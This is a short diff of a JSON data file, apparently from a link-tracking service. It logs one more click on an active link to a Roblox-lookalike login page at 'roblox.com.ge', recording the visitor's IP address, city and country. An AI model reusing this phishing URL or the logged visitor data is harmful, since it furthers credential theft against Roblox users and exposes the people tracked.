@@ -166,7 +166,7 @@
     "targetUrl": "https://roblox.com.ge/login?returnUrl=0920460288224362",
     "createdAt": 1776592397121,
     "status": "active",
-    "useCount": 1586,
+    "useCount": 1587,
     "createdBy": "admin",
     "clicks": [
       {
@@ -12856,6 +12856,14 @@
         "city": "Caloocan",
         "flag": "🇵🇭",
         "countryCode": "PH"
+      },
+      {
+        "timestamp": 1777465190517,
+        "ip": "175.136.141.70",
+        "country": "Malaysia",
+        "city": "Kuching",
+        "flag": "🇲🇾",
+        "countryCode": "MY"
       }
     ]
   },
